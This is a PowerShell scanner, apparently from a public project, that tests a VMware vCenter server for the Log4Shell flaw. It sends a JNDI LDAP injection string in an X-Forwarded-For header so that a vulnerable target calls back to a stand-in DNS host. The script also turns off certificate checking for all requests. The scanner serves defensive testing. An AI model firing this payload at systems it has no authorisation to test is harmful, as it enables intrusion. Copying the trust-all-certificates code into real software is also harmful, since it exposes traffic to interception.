# CVE-2021-44228 - Log4j Powershell Checker
# Version: VMWare vCenter
#
# Perform a scan of a single VMWare vCenter to see 
# if it's vulnerable for the above-mentioned CVE.
#
# https://github.com/crypt0jan/log4j-powershell-checker
#
# License: MIT license.
# _____________________________________________________

# Suppress warnings
$ErrorActionPreference = "silentlyContinue"

# Change this to your NameServer
# See: https://github.com/crypt0jan/log4j-powershell-checker
$NameServer = "log4jdnsreq.example.com"

# Enable Proxy
$Proxy = $false

if ($Proxy) {
    $ProxyServer = "http://proxyserver:8080"
    $ProxyCredentials = Get-Credential
    [system.net.webrequest]::DefaultWebProxy = New-Object System.Net.webproxy($ProxyServer);
    [system.net.webrequest]::DefaultWebProxy.Credentials = New-Object System.Net.NetworkCredential($ProxyCredentials.Username, $ProxyCredentials.Password);
}

# Check input args
$target = $null
if (!$args[0]) { 
    Write-Host "I need a target.."
    Write-Host "Example: .\log4j_ps_checker.ps1 https://vmware-vcenter"
    Exit
} else {
    $target = $args[0]
    Write-Host ("Scanning target: {0}" -f $target)
}

# Trust all certificates because we are running this on internal servers only
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
            return true;
        }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

# Check 1 (User Agent)
Write-Host "-- CHECK 1 --" -ForegroundColor red -BackgroundColor white
Write-Host "Sending request to $target using User-Agent injection..."

$uar = $null
$id = ([System.Uri]$target).Host -replace '^www\.'
$JsonHeader = @{ 'X-Forwarded-For' = '${jndi:ldap://' + $($id) + '.' + $($NameServer) + '/test.class}' }
try {
    $uar = Invoke-WebRequest "$($target)/websso/SAML2/SLO/vsphere.local?SAMLRequest=" -Headers $JsonHeader
}catch {
    $uar = $_.Exception
}

#Write-Host $uar

# CLEAR PROXY
if ($Proxy) {
    [system.net.webrequest]::defaultwebproxy = New-Object System.Net.WebProxy($null)
}

# _______________________
# Now, go to your $NameServer and check file 
# '/var/log/named/query.log' for incoming requests.
# If there is a request, the $target is vulnerable!

Write-Host "Check /var/log/named/query.log on your NameServer."
Write-Host "Incoming connection from your target means vulnerable!"
